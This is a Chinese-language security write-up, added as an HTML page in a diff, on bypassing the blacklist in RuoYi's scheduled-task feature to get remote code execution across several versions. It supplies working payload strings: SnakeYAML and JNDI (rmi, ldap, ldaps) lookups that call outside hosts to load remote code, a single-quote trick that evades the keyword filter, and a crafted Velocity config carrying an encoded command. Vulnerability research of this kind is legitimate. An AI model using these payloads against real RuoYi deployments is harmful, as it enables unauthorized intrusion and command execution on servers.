@@ -1,0 +1,123 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>若依的rce点有两处，一处是定时任务，另外一处是thymeleaf的模板注入，本文着重针对定时任务的黑名单绕过</p>
+<p>rce的原理分析其他师傅的文章已经讲的很明白了，此文不过多赘述</p>
+<p>若依的定时任务为我们提供了可以执行某些类的某些方法，这些类方法必须满足以下条件</p>
+<ul>
+<li>具有无参构造方法</li>
+<li>调用的方法需要是类自身声明的方法，不能是他的父类方法</li>
+<li>构造方法和调用的方法均为 public</li>
+</ul>
+<h2 data-content="1" id="ead52ec426e2718012355bfb61c2105c">&lt;4.6.2</h2>
+<p>这个版本之前无任何限制，可直接使用公开poc打</p>
+<div class="highlight"><pre><span></span><span class="n">org</span><span class="o">.</span><span class="na">yaml</span><span class="o">.</span><span class="na">snakeyaml</span><span class="o">.</span><span class="na">Yaml</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="err">'</span><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://192.168.3.3:2333/yaml-payload.jar"</span><span class="o">]]]]</span><span class="err">'</span><span class="o">)</span>
+
+<span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">JndiLocatorDelegate</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="err">'</span><span class="n">rmi</span><span class="o">:</span><span class="c1">//127.0.0.1:1099/refObj')</span>
+<span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">InitialContext</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="err">'</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//127.0.0.1:9999/#Exploit')</span>
+</pre></div>
+<h4 data-content="1" id="b33cf7489496000964466e4f0e6da5bd">不出网rce</h4>
+<p>这个版本下网上公开的大多为出网的利用，snakeyaml本身有个不出网写文件poc，但是在若依这里，逗号会造成截断，snakeyaml不支持unicode，十六进制编码，所以效果并不是纳闷好</p>
+<p>但是我们可以使用file协议达到不出网的利用，前提是我们可以上传一个文件，这个文件的后缀可以是任意，若依提供了一个接口可以进行上传</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123737-523a422c-9919-1.png"/><br/>
+此时我们需要找到上传后的绝对路径，但是上传路径写于配置文件中，对于linux来说大多都会进行修改</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123759-5f76e22e-9919-1.png"/></p>
+<p>恰好若依的配置类是public修饰且有无参构造方法，setProfile也为public修饰</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123810-65ff4906-9919-1.png"/></p>
+<p>我们可以利用计划任务发射修改这个值，达到可控目录上传，从而利用file协议达到稳定的不出网rce</p>
+<p>poc</p>
+<div class="highlight"><pre><span></span><span class="n">com</span><span class="o">.</span><span class="na">ruoyi</span><span class="o">.</span><span class="na">common</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">RuoYiConfig</span><span class="o">.</span><span class="na">setProfile</span><span class="o">(</span><span class="err">'</span><span class="n">E</span><span class="o">:/</span><span class="n">test</span><span class="err">'</span><span class="o">)</span>
+
+<span class="n">org</span><span class="o">.</span><span class="na">yaml</span><span class="o">.</span><span class="na">snakeyaml</span><span class="o">.</span><span class="na">Yaml</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="err">'</span><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"file://上传的绝对路径"</span><span class="o">]]]]</span><span class="err">'</span><span class="o">)</span>
+</pre></div>
+<h2 data-content="1" id="cb96cc0f8b9e6515660d6c23ac06849b">&gt;=4.6.2  &lt;4.7.2</h2>
+<p>这个版本采用了黑名单限制调用字符串</p>
+<ul>
+<li>定时任务屏蔽ldap远程调用</li>
+<li>定时任务屏蔽http(s)远程调用</li>
+<li>定时任务屏蔽rmi远程调用</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123827-70565214-9919-1.png"/></p>
+<h3 data-content="1" id="0e43dd3d5cf09134f55a60c4aad96e4d">bypass</h3>
+<p>我们依然可以用上面的file协议达到不出网的rce效果，不过这个黑名单还有其他的绕过方式</p>
+<h4 data-content="1" id="a634bf656638a7ace0949599a6ce77e1">ldaps</h4>
+<p>上面协议并没用禁止掉ldaps的调用，我们需要在我们ldap服务器上搭载一层ssl，依然可以实现ldap注入，不过相关实现比较麻烦</p>
+<h4 data-content="1" id="e0f8cd360c85c8c51223c82728d2367e">其他协议</h4>
+<p>例如ftp，file协议</p>
+<h4 data-content="1" id="66fbb9e499a7d07af13144c7d42c9261">单引号</h4>
+<p>针对调用字符串的处理，若依会将参数中的所有单引号替换为空，这就为我们提供了可乘之机，我们只需要在我们调用的危险字符间加入单引号即可绕过</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123844-7a2192cc-9919-1.png"/></p>
+<p>poc:</p>
+<div class="highlight"><pre><span></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">JndiLocatorDelegate</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="sc">'r'</span><span class="n">m</span><span class="err">'</span><span class="n">i</span><span class="o">:</span><span class="c1">//127.0.0.1:1099/refObj')</span>
+</pre></div>
+<h2 data-content="1" id="96447a0f10a01719e9dd3cbb39170f85">4.7.2</h2>
+<p>这个版本的解决办法依然是加入黑名单</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123903-8592a574-9919-1.png"/></p>
+<p>网上公开的poc全部不可用，这里我跟了下class.forname的native层代码并没有找到可用的一些变形，java/net/URL这种会在native层抛出报错</p>
+<p>解决办法只能寻找新的类，我暂时总结了一下依靠字符串可以造成rce的点</p>
+<ul>
+<li>jndi</li>
+<li>urlclassloader（<a href="https://tttang.com/archive/1405/#toc_groovyclassloader" target="_blank">GroovyClassLoader</a>）</li>
+<li>命令执行</li>
+<li>表达式</li>
+<li>加载指定路径的动态链接库文件</li>
+<li>反序列化</li>
+<li>jdbc反序列化(8.0.20)</li>
+</ul>
+<p>但是这里又带来了新的问题，满足只能字符串造成rce的点基本都是远程调用，而若依又屏蔽了相关的关键字，我找到了jndibypass常用的一个类javax.el.ELProcessor#eval，但是调用此类的时候发现表达式中的右括号，若依在处理的时候会造成截断</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123930-958d622a-9919-1.png"/></p>
+<p>调用字符串只要出现)后面的字符串就会被丢弃。此路不通</p>
+<h3 data-content="1" id="d8e80c40460b9e5e0c7d945ed731b3f3">bypass</h3>
+<h4 data-content="1" id="738939b614b614af41a7977b936b0301">ldaps</h4>
+<p>这里黑名单依然没有限制ldaps，不过我们得寻找一个新得类进行ldaps注入，这里提供一个</p>
+<p>poc：</p>
+<div class="highlight"><pre><span></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">datasource</span><span class="o">.</span><span class="na">lookup</span><span class="o">.</span><span class="na">JndiDataSourceLookup</span><span class="o">.</span><span class="na">getDataSource</span><span class="o">(</span><span class="err">'</span><span class="n">ldaps</span><span class="o">:</span><span class="c1">//xxx')</span>
+</pre></div>
+<h4 data-content="1" id="ba4e5450c7b0cc56cdf50ad87801bf31">配置文件rce</h4>
+<p>这里灵感来源于log4j得配置文件rce，我们找到了velocity的配置文件，这里可以配置我们的jndi地址，我们需要找到一个source点</p>
+<p>org.apache.velocity.runtime.RuntimeInstance#init</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301123944-9e0431fe-9919-1.png"/></p>
+<p>这里的setProperties便是读取输入的配置文件路径并生成一个配置类，只要我们文件可控，这个配置类便完全可控，配置文件示例</p>
+<div class="highlight"><pre><span></span><span class="err">resource.loader = ds</span>
+<span class="err">ds.resource.loader.public.name = DataSource</span>
+<span class="err">ds.resource.loader.description = Velocity DataSource Resource Loader</span>
+<span class="err">ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader</span>
+<span class="err">ds.resource.loader.datasource_url = ldap://xxx:1389/TomcatBypass/Command/Base64/Y2FsYy5leGU=</span>
+<span class="err">ds.resource.loader.resource.table = tb_velocity_template</span>
+<span class="err">ds.resource.loader.resource.keycolumn = id_template</span>
+<span class="err">ds.resource.loader.resource.templatecolumn = template_definition</span>
+<span class="err">ds.resource.loader.resource.timestampcolumn = template_timestamp</span>
+<span class="err">ds.resource.loader.cache = false</span>
+<span class="err">ds.resource.loader.modificationCheckInterval = 60</span>
+</pre></div>
+<p>不同版本的velocity，配置文件写法有所差异</p>
+<p>跟进init方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124002-a8fba47a-9919-1.png"/></p>
+<p>跟进initializeResourceManager方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124018-b200938c-9919-1.png"/></p>
+<p>跟进initialize方法，这里会根据配置文件中的resource.loader.class 选择合适的resourceloader，我们选择datasourceresourceloader，这里可以到达我们的sink点</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124149-e83aec40-9919-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124159-ee8e7b84-9919-1.png"/></p>
+<p>到达datasourceresourceloader的init方法，这里的datasource我们可以根据配置文件进行控制</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124212-f6107b28-9919-1.png"/></p>
+<p>而sink点在此类下的openDBConnection方法，datasourcename我们完全可控</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124222-fc49f56e-9919-1.png"/></p>
+<p>我们回到org.apache.velocity.runtime.RuntimeInstance#init方法，设置完resourceloder后，velocity会根据配置文件得到的配置类进行相关初始化与check，而其中的initVelocimacro会check datasourcename</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124234-033dbc5c-991a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124244-096bc330-991a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124254-0f5c8c48-991a-1.png"/></p>
+<p>调用栈如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124305-159b694e-991a-1.png"/></p>
+<p>我们通过上面4.6.2版本的方法可控目录上传一个配置文件即可绕过若依的黑名单，通过org.apache.velocity.runtime.RuntimeInstance#init达到稳定出网rce</p>
+<p>poc：</p>
+<div class="highlight"><pre><span></span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">velocity</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">RuntimeInstance</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="err">'</span><span class="n">E</span><span class="o">:/</span><span class="n">ee</span><span class="o">.</span><span class="na">txt</span><span class="err">'</span><span class="o">)</span>
+</pre></div>
+<h4 data-content="1" id="00c92cbf302d7ccb07b09bdb2cad2e5a">不出网rce</h4>
+<p>这里利用的是com.sun.glass.utils.NativeLibLoader#loadLibrary方法(浅蓝师傅jndi byapss文章中提到的)，我们只需要上传一个.dll(.so)文件即可通过此方法执行命令，但是较为可惜的是，此方法限制了后缀必须为.dll .so，这在若依里是没办法上传的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124317-1d2d1806-991a-1.png"/></p>
+<p>这里需要我们重新挖掘一个类，帮助我们可以重命名一个文件，感兴趣的师傅可以研究一下</p>
+<h2 data-content="1" id="25d049e06bbc7f373f866cdda6273842">4.7.3（最新版）</h2>
+<p>这个版本刚好今天更新(3.1)限制改为了黑白名单，只能调用com.ruoyi包下的类!<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20220301124333-26a17d6e-991a-1.png"/></p>
+<p>暂时没有好的绕过思路。</p>
+</div>
+</div>
